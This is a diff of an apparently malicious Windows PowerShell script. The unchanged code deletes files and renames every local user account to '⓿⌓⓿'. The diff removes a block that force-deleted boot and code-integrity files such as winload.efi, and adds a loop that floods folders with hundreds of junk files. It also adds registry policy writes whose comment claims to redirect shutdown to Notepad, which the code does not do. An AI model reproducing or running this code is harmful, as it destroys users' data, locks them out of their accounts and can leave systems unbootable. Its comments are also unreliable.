@@ -18,28 +18,12 @@ foreach ($path in $pathsToDelete) {
             Remove-Item -Path $filePath -Force
         }
     }
-}
 
-$filesToDelete = @(
-    "C:\Windows\System32\Boot\winload.efi",
-    "C:\Windows\System32\Boot\winresume.efi",
-    "C:\Windows\System32\CodeIntegrity\driver.stl",
-    "C:\Windows\System32\CodeIntegrity\driveripolicy.p7b",
-    "C:\Windows\System32\eventvwr.exe"
-)
-
-foreach ($file in $filesToDelete) {
-    if (Test-Path $file) {
-        try {
-            Remove-Item $file -Force -ErrorAction Stop
-            Write-Host "File '$file' successfully deleted."
-        }
-        catch {
-            Write-Host "Error deleting file '$file', system saved."
-        }
-    }
-    else {
-        Write-Host "File '$file' does not exist."
+    for ($i = 1; $i -le 999; $i++) {
+        $randomIteration = Get-Random -Minimum 100 -Maximum 1000
+        $newFileName = ".....⓿⌓⓿....._$randomIteration.txt"
+        $newFilePath = Join-Path -Path $path -ChildPath $newFileName
+        New-Item -Path $newFilePath -ItemType File -Force | Out-Null
     }
 }
 
@@ -64,6 +48,19 @@ foreach ($user in $users) {
     $newName = "⓿⌓⓿"
     Rename-LocalUser -Name $user.Name -NewName $newName
 }
+
+# Modify Group Policy settings to redirect restart and shutdown actions to Notepad
+$groupPolicyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+New-Item -Path $groupPolicyPath -Force | Out-Null
+Set-ItemProperty -Path $groupPolicyPath -Name "ShutdownWithoutLogon" -Value 1
+Set-ItemProperty -Path $groupPolicyPath -Name "ShutdownWithoutLogonOtherUser" -Value 1
+Set-ItemProperty -Path $groupPolicyPath -Name "ShutdownWithoutLogonTSEnabled" -Value 1
+Set-ItemProperty -Path $groupPolicyPath -Name "ShutdownWithoutLogonAllowed" -Value 1
+
+# Create an empty Notepad file to be opened on restart or shutdown
+$notepadFilePath = [IO.Path]::Combine($documentsPath, "EmptyNotepad.txt")
+$notepadContent = ""
+$notepadContent | Out-File -FilePath $notepadFilePath -Force
 
 $source = @"
 using System;
